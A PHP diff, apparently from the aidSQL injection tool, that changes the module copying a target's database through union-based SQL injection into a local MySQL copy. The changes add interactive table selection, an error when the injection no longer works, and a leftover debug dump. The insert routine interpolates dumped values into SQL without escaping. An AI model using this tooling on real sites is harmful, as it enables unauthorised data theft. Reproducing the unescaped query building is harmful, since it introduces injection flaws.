@@ -16,7 +16,6 @@
 				$this->_xmlFile		=	new \aidSQL\core\File($config["makedb"]);
 				$this->setLog($log);
 				$this->_httpAdapter	=	$httpAdapter;
-				$pLoader->setConfig($config);
 				$this->_pLoader		=	$pLoader;
 				
 				$this->makeDb();
@@ -70,7 +69,7 @@
 					foreach($injectChilds as $injectChild){
 
 						if(sizeof($injectChild->childNodes)>0){
-							$injection[$nodeName][]	=	$injectChild->nodeValue;
+							$injection[$nodeName][$injectChild->nodeName]	=	$injectChild->nodeValue;
 						}else{
 							$injection[$nodeName]	=	$injectChild->nodeValue;
 						}
@@ -168,7 +167,9 @@
 				$schemas	=	$this->parseXml();
 				$plugin	=	$this->_pLoader->getPluginInstance("sqli","mysql5",$this->_httpAdapter,$this->_logger);
 
-				$plugin->injectionUnionWithConcat();
+				if(!$plugin->injectionUnionWithConcat()){
+					throw (new \Exception("Could not make database, perhaps the sql injection vulnerability was solved?"));
+				}
 
 				foreach($schemas as $schemaName=>$schemaTables){
 
@@ -180,7 +181,31 @@
 
 					$mysqli->select_db("aidSQL_".$schemaName);
 
+					if(array_key_exists("interactive",$this->_config)){
+
+						$tables				=	array_keys($schemaTables);
+						$selectedIndexes	=	interactive($this->_logger,$tables);
+
+						foreach($tables as $k=>$v){
+
+							if(!in_array($k,$selectedIndexes)){
+								unset($tables[$k]);
+							}
+
+						}
+
+					}
+
 					foreach($schemaTables as $schemaTableName=>$schemaTableValues){
+
+						if(isset($selectedIndexes)){
+
+							if(!in_array($schemaTableName,$tables)){
+								$this->log("Omitting table $schemaTableName",0,"yellow");
+								continue;
+							}
+	
+						}
 
 						if($this->createTable($mysqli,$schemaTableName,$schemaTableValues)!==TRUE){
 							throw(new \Exception("Couldnt create table $schemaTableName"));
@@ -214,10 +239,9 @@
 
 							$plugin->setInjectionParameters($parameters);
 
-							$values	=	$plugin->unionQuery($select,$from,array(),array());
-							$values	=	$values[0];
-							
-							$values	=	explode('|',$values);
+							$values				=	$plugin->unionQuery($select,$from,array(),array());
+							$values				=	$values[0];
+							$values				=	explode('|',$values);
 
 							if(!$this->insertRegisters($mysqli,$schemaTableName,$columns,$values)){
 								throw(new \Exception("Couldnt insert registers on $schemaTableName table!"));
@@ -262,9 +286,19 @@
 			public function insertRegisters(\MySQLi &$sqli,$tableName,Array $columns,Array $registers){
 			
 				$sql		=	"INSERT INTO $tableName SET ";
-				$columns	=	array_combine($columns,$registers);
+				$result	=	array_combine($columns,$registers);
 
-				foreach($columns as $colName=>$colVal){
+				if(!$result){
+
+					echo "COLUMNS\n";
+					var_dump($columns);
+					echo "REGISTERS\n";
+					var_dump($registers);
+					die();
+
+				}
+
+				foreach($result as $colName=>$colVal){
 					$sql.="$colName='$colVal',";
 				}
 
